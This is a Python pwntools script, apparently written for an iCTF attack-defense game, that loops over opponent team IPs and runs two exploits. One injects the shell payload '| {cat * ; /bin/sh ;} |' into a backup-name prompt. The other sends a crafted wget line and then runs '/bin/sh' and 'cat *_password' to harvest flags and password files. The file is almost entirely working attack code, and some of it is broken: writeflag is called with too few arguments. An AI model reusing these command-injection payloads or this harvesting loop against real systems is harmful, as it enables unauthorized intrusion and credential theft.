#!/usr/bin/env python 
from pwn import *

def writeflag (team,flagdata, exp_type):
     with open('flags/'+team+"_"+exp_type+".txt","w+") as fout:
         fout.write (flagdata)
         fout.close()

def backup_flag (teamid , teamip):
     print ("%s --- %s"%(teamid, teamip))
     #
     # Establih a Connection to the Server
     try:
         c = remote(teamip,10001)
         print c.readuntil('>')
         print c.sendline('2')
         print c.readuntil('Select a name for your backup:')
         print c.sendline('| {cat * ; /bin/sh ;} |')
         print c.readuntil('Choose a secure password for your backup:')
         print c.sendline(' ')
         print c.readuntil('Here is your backup data that was stored securely:')
         print c.sendline('ls')
         print c.sendline('cat *')
         flagfile = c.recvall(timeout=1)
         print ("%s"%(flagfile))
         c.close()
     except:
         flagfile = "Server  Not   Available"
     else:
         return flagfile

def sampleak_flag (teamid , teamip):
     print ("%s --- %s"%(teamid, teamip))
     #
     # Establih a Connection to the Server
     try:
         c = remote(teamip,10003)
         print c.sendline('wget ' + teamip +'/10003/attend&kids=*')
         print c.readuntil('Redirecting output to  wget-log*')
         print c.sendline('/bin/sh/')
         print c.sendline('cd /opt/ictf/services/sampleak/append')
         print c.sendline('ls')
         print c.sendline('cat *_password')
         flagfile = c.recvall(timeout=1)
         print ("%s"%(flagfile))
         c.close()
     except:
         flagfile = "Server  Not   Available"
     else:
         return flagfile

badServer = {}

def main (exp_type):
     try:
       with open ("spy.dat","r+") as file:
         print ("TeamID    IP ")
         for lines in file:
              if (len(lines) == 0):
                 break
              data = lines.split(",")
              teamid = data[0]
              teamip = data[1]
              print (badServer.get(teamid))
              if  (badServer.get(teamid) != "None"):
                  #print ("%s --- %s"%(teamid,teamip))

                  if (exp_type == "backup"):
                  	flagdata = backup_flag(teamid,teamip)
                  elif (exp_type == "sampleak"):
                  	flagdata = sampleak_flag(teamid, teamip)

                  #print ("%s---%s"%(teamid,flagdata))
                  writeflag (teamid,flagdata)
         file.close()
     except:
        print ('Invalid Connection  %s '%(teamid))
        badServer [teamid]='InvalidConnection'


# Main routine
if __name__ == "__main__":
    while True:
         main("backup")
         main("sampleak")
         time.sleep(1)